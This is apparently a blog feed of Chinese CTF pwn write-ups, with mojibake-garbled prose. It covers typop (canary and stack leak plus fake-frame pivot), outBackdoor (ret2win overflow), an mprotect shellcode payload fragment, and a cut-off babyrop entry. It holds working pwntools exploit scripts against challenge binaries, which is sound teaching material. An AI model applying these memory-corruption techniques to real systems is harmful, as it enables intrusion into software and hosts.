·ä»¥åæ‰åœ¨è¿™ä¸ªå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°åé¢åŠ çœŸå®çš„è¿”å›åœ°å€,å…·ä½“å®ä¾‹å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop</span></span><br><span class="line"><span class="string">pop </span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=p32(mprotect)+p32(pop3_ret)+p32(bss)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>) <span class="comment">#ä¿®æ”¹.bssçš„æƒé™</span></span><br><span class="line">payload+=p32(read)+p32(pop3_ret)+p32(<span class="number">0</span>)+p32(shellcode_addr)+p32(<span class="number">0x100</span>) <span class="comment">#è¯»å…¥shellcode</span></span><br><span class="line">payload+=p32(shellcode_addr) <span class="comment">#è¿”å›åˆ°shellcodeçš„å­˜å‚¨åœ°å€</span></span><br><span class="line">io.sendline(shellcode) <span class="comment">#å‘é€shellcode</span></span><br></pre></td></tr></table></figure><h2 id="5-å¼•ç”¨é“¾æ¥">5.å¼•ç”¨é“¾æ¥</h2><p><a href="https://cloud.tencent.com/developer/article/1740266">https://cloud.tencent.com/developer/article/1740266</a></p><p><a href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦:&lt;/h2&gt;
&lt;p&gt;è¿™é¢˜æ¶‰åŠåˆ°äº†x86å‡½æ•°è°ƒç”¨çº¦å®šçš„å†…å®¹,ç”±äºé¢˜ä¸»å¯¹cå’Œæ±‡ç¼–äº†è§£å¾—å¹¶æ²¡æœ‰éå¸¸æ·±å…¥,å¯¼è‡´é‡åˆ°äº†ç°å¸¸å¤šçš„å›°éš¾ğŸ˜­,æ•´åˆäº†å¾ˆå¤šå¸ˆå‚…çš„é¢˜è§£,çŸ¥è¯†ç‚¹æ€»ç»“åœ¨æœ€å.&lt;/p&gt;
&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="å¤ç°" scheme="https://www.fomal.cc/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>typop Write Up</title>
    <link href="https://www.fomal.cc/posts/28066d78.html"/>
    <id>https://www.fomal.cc/posts/28066d78.html</id>
    <published>2023-04-02T03:02:22.722Z</published>
    <updated>2023-04-09T06:24:40.684Z</updated>
    
    <content type="html"><![CDATA[<p>å‰è¨€,æœ¬é¢˜ä½¿ç”¨äº†fake frameæ‰‹æ³•</p><h2 id="1-æºä»£ç ">1.æºä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">getFeedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+Eh] [rbp-12h] BYREF</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+16h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you like ctf?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">30uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You said: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)buf == <span class="number">121</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s great! &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Aww :( &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you provide some extra feedback?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x5A</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">win</span><span class="params">(<span class="type">char</span> a1, <span class="type">char</span> a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  _BYTE filename[<span class="number">10</span>]; <span class="comment">// [rsp+26h] [rbp-4Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  filename[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  filename[<span class="number">0</span>] = a1;</span><br><span class="line">  filename[<span class="number">1</span>] = a2;</span><br><span class="line">  filename[<span class="number">2</span>] = a3;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;filename[<span class="number">3</span>], <span class="string">&quot;g.txt&quot;</span>);</span><br><span class="line">  stream = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error opening flag file.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  fgets(s, <span class="number">32</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">puts</span>(<span class="string">&quot;Do you want to complete a survey?&quot;</span>) &amp;&amp; getchar() == <span class="number">121</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    getchar();</span><br><span class="line">    getFeedback();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-åˆ†ææ¼æ´">2. åˆ†ææ¼æ´</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹é˜²æŠ¤å…¨å¼€,ç”¨IDAåç¼–è¯‘å‘ç°æœ‰åé—¨å‡½æ•°å¹¶ä¸”æœ‰å¯ä»¥å¾ªç¯è°ƒç”¨çš„getfeedbackå‡½æ•°,ä½†æ˜¯åé—¨å‡½æ•°é‡Œé¢æ‰“å¼€flagçš„æ–‡ä»¶åä¸å®Œæ•´,ä½†æ˜¯é™„ä»¶æ²¡ç»™libcè€Œä¸”gadgetsä¹Ÿä¸å¤Ÿå¸ƒç½®å®Œæ•´çš„ROPæ¥æŠŠå‰ä¸‰ä¸ªå­—ç¬¦ä¼ è¿›filename.ä¸è¿‡ç”±äºgetfeedback()å’Œwin()åˆ†åˆ«æœ‰bufå’Œfilenameä¸¤ä¸ªæœ¬åœ°å˜é‡,è€Œåœ¨å‡½æ•°çš„æ ˆå¸§ä¸­é€šå¸¸ç”¨RBPæ¥è®¿é—®å˜é‡,é‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹getfeedback()çš„RBPæŒ‡å‘çš„åœ°å€å’Œ]RBP+8],å³è¿”å›åœ°å€.</p><p>â€‹é‚£ä¹ˆç°åœ¨çš„æ€è·¯å·²ç»åŸºæœ¬æœ‰äº†:</p><p>â€‹ç¬¬ä¸€æ¬¡è°ƒç”¨getfeedback(),åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶è¦†ç›–canaryä½ä½ä¸Šçš„\x00,å› ä¸ºcanaryä¸€èˆ¬å’Œæ ˆåº•è·ç¦»ä¸€ä¸ªæœºå™¨å­—é•¿,æ‰€ä»¥ä¼šé¡ºå¸¦ç€æŠŠprevious RBPä¹Ÿç»™æ‰“å°å‡ºæ¥,è¿™æ˜¯ä¸€ä¸ªæ ˆä¸Šçš„åœ°å€,æ ¹æ®æœ¬åœ°è°ƒè¯•å°±å¯ä»¥è®¡ç®—å‡ºæ ˆåŸºåœ°å€æ¥è¦†ç›–RBP,getfeedback()ç¬¬ä¸€æ¬¡è¾“å…¥åªèƒ½æ³„éœ²æ ˆå’Œcanary,ä¸è¿‡æœ‰ç¬¬äºŒæ¬¡çš„è¾“å…¥å¯ä»¥è¡¥å›canaryçš„å€¼é˜²æ­¢å´©æºƒ,æ‰€ä»¥ç¬¬äºŒæ¬¡è¾“å…¥æŠŠcanaryè¿˜åŸæ¥è¿›è¡Œä¸‹ä¸€æ¬¡è°ƒç”¨getfeedback();</p><p>â€‹ç¬¬äºŒæ¬¡è°ƒç”¨getfeedback(),è®¡ç®—å¥½åç§»é‡æŠŠ[RBP+8]ç»™æ‰“å°å‡ºæ¥,é€šè¿‡IDAé‡Œé¢åç§»åœ°å€è®¡ç®—å‡ºåŸºåœ°å€,å†æ ¹æ®éœ€è¦ç®—å‡ºè¦æ§åˆ¶çš„RBPåœ°å€,è€æ ·å­ç¬¬äºŒæ¬¡è¾“å…¥è¡¥å…¨canary;</p><p>â€‹ç¬¬ä¸‰æ¬¡è°ƒç”¨getfeedback(),ç”±äºROPé“¾çš„gadgetä¸å…¨,æ‰€ä»¥åº”è¯¥æ˜¯åœ¨åŸå…ˆgetfeedback()çš„bufä¸Šè¾“å…¥filename,ä¹Ÿå°±æ˜¯flag.txt\x00,å†é€šè¿‡æ ˆæº¢å‡ºæ“æ§RBPå’ŒRIPæŠŠflag.txt\x00å½“ä½œæ˜¯filename()æ‰“å¼€,å› æ­¤è¦†ç›–ç”¨çš„è¿”å›åœ°å€ä½¿ç”¨çš„win()é‡Œé¢è°ƒç”¨fopen()çš„èµ·å§‹åœ°å€,è€Œè¦è¦†ç›–çš„RBPåœ°å€å°±æ¯”è¾ƒéšä¾¿,ç»è¿‡äº†ç®€å•çš„è°ƒè¯•,å‘ç°å¦‚æœæŠŠRBPè·³è½¬åˆ°å¯ä»¥æŠŠbufåˆšå¥½å½“ä½œfilenameè¯»å…¥çš„æ—¶å€™,ä¹Ÿå°±æ˜¯ä¸‹é¢çš„expé‡Œæœ€åä¸€ä¸ªpayloadçš„å‰é¢10å­—èŠ‚,å½“RBPè¢«è®¾ç½®æˆè¿™10ä¸ªå­—èŠ‚é™„è¿‘åŒºåŸŸè¯»å–filenameæ—¶ä¼šå‡ºç°è¯»å–å¤±è´¥,å³ä½¿flag.txt\x00å·²ç»è¢«ä¼ å…¥RDI,fopen()ä¾ç„¶ä¼šè°ƒç”¨å¤±è´¥,æœ€åç¨å¾®è°ƒè¯•ä¸€ä¸‹æŠŠRBPè®¾ç½®æˆè¯»å–æ›´é«˜ä¸€äº›åœ°å€çš„åŒºåŸŸä½œä¸ºfilenameæ—¶,flagè¢«æˆåŠŸè¯»å–.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./typop&#x27;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²canaryå’Œæ ˆåœ°å€</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;y&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>))-<span class="number">0xa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">stack = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x38</span> <span class="comment">#å‡å»0x10è®©RBPæŒ‡å‘çš„åœ°å€å­˜æ”¾è‡ªå·±çš„åœ°å€,åŠ ä¸Š0x38è®©RBPè¯»å–çš„filenameå’Œbufå¯¹é½,ä¸è¿‡è¿™æ ·æ”¹ä¼šæ‰“ä¸å¼€æ–‡ä»¶,æ‰€ä»¥åé¢å†åŠ äº†åç§»</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³„éœ²ç¨‹åºåŠ è½½åŸºåœ°å€</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you want to complete a survey?&#x27;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Do you like ctf?&#x27;</span>, <span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="number">0x1a</span>*<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x447</span>+<span class="number">0x298</span>+<span class="number">0x51</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¿®æ”¹RBPè¯»å…¥æ–‡ä»¶å,è·å–flag</span></span><br><span class="line">payload = <span class="number">10</span>*<span class="string">b&#x27;y&#x27;</span>+p64(canary)+p64(stack+<span class="number">0x22</span>)+p64(addr)+<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">åœ¨flag.txt\x00å‰é¢æœ‰0x22å­—èŠ‚æ•°æ®,stack+0x22åˆšå¥½å¯ä»¥è®©flag.txt\x00è¡”æ¥åœ¨payloadåé¢</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;Can you provide some extra feedback?&#x27;</span>, payload)</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‰è¨€,æœ¬é¢˜ä½¿ç”¨äº†fake frameæ‰‹æ³•&lt;/p&gt;
&lt;h2 id=&quot;1-æºä»£ç &quot;&gt;1.æºä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>sh_v1.1 WP</title>
    <link href="https://www.fomal.cc/posts/456d7704.html"/>
    <id>https://www.fomal.cc/posts/456d7704.html</id>
    <published>2023-04-02T03:02:22.720Z</published>
    <updated>2023-04-09T06:24:36.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>outBackdoor Write Up</title>
    <link href="https://www.fomal.cc/posts/d5134afd.html"/>
    <id>https://www.fomal.cc/posts/d5134afd.html</id>
    <published>2023-04-02T03:02:22.719Z</published>
    <updated>2023-04-09T06:24:33.499Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-åˆ†æ">1.åˆ†æ</h2><p>æ‹¿åˆ°é¢˜ç›®å…ˆç”¨checksecæ£€æŸ¥å‘ç°æ²¡æœ‰å¼€å¯canaryä¿æŠ¤,ç”¨IDA64åˆ†æå‘ç°<code>gets(v4)</code>æœ‰æ ˆæº¢å‡ºçš„æ¼æ´å¯ä»¥åˆ©ç”¨,åˆå‘ç°æœ‰ç›´æ¥è¿”å›shellçš„outBackdoorå‡½æ•°.<br>ç›´æ¥æ‰§è¡Œç¨‹åºå‘ç°æƒé™ä¸è¶³,ä½¿ç”¨<code>chmod 755 outBackdoor</code>æ¥ææƒ<br>ç”¨cyclicç”Ÿæˆä¸€ä¸²å¤§äº16çš„å­—ç¬¦ä¸²å¤åˆ¶ä¸‹æ¥<br><code>cyclic 32 aaaabaaacaaadaaaeaaafaaagaaahaaa</code><br>å¯¹æ–‡ä»¶gdbè°ƒè¯•,è¾“å…¥å­—ç¬¦ä¸²,å‡ºç°æ ˆæº¢å‡º<br><code>*RSP  0x7fffffffdd78 â—‚â€” 'gaaahaaa'</code><br>ç»è¿‡è®¡ç®—å‘ç°æ˜¯åœ¨å‰24ä¸ªå­—ç¬¦æ—¶çš„ä½ç½®å‡ºç°,<br>æ‰€ä»¥éœ€è¦åœ¨è¿™ä¸ªä½ç½®è¦†ç›–ä¸Šè¿”å›shellçš„å‡½æ•°åœ°å€.</p><h2 id="2-exploitation">2.exploitation</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;ip&#x27;</span>,&lt;port&gt;)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(<span class="number">0x4011D7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰æˆåŠŸè¿”å›shell,ä¸Šç½‘æŸ¥æ‰¾å‘ç°è²Œä¼¼å’Œsystemå‡½æ•°æœ‰å…³,æ›´æ¢åœ°å€ä¸ºåé—¨å‡½æ•°åœ°å€çš„ä¸‹ä¸€ä¸ªåœ°å€<code>0x4011D8</code>æˆåŠŸè·³è½¬åˆ°å‡½æ•°,è¿”å›shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">W...w...Wait? Who put this backdoor out back here?</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libc-2.27.so</span><br><span class="line">outBackdoor</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-åˆ†æ&quot;&gt;1.åˆ†æ&lt;/h2&gt;
&lt;p&gt;æ‹¿åˆ°é¢˜ç›®å…ˆç”¨checksecæ£€æŸ¥å‘ç°æ²¡æœ‰å¼€å¯canaryä¿æŠ¤,ç”¨IDA64åˆ†æå‘ç°&lt;code&gt;gets(v4)&lt;/code&gt;æœ‰æ ˆæº¢å‡ºçš„æ¼æ´å¯ä»¥åˆ©ç”¨,åˆå‘ç°æœ‰ç›´æ¥è¿”å›shellçš„outBackdoorå‡½æ•°.&lt;br&gt;
ç›´æ¥æ‰§è¡Œç¨‹åº</summary>
      
    
    
    
    <category term="é¢˜è§£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>OGeek2019babyrop 1</title>
    <link href="https://www.fomal.cc/posts/875b5e79.html"/>
    <id>https://www.fomal.cc/posts/875b5e79.html</id>
    <published>2023-04-02T03:02:22.717Z</published>
    <updated>2023-04-09T06:24:26.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">process</span><span class="params">(<span class="type">int</span> privous_buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> sucLen; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, privous_buf);               <span class="comment">// print the random integer into s</span></span><br><span class="line">  sucLen = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);                 <span class="comment">// guess the random</span></span><br><span class="line">  buf[sucLen - <span class="number">1</span>] = <span class="number">0</span>;                          <span class="comment">// &#x27;\x00&#x27;</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )                    <span class="comment">// compare NULL and the random integer</span></span><br><span class="line">                                                <span class="comment">// definitely the return is True and execute exit()</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);                    <span class="comment">// if not ,this is the notice</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">process2</span><span class="params">(<span class="type">char</span> buf7)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( buf7 == <span class="number">127</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, buf7);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  initialization();</span><br><span class="line">  fd = open(<span 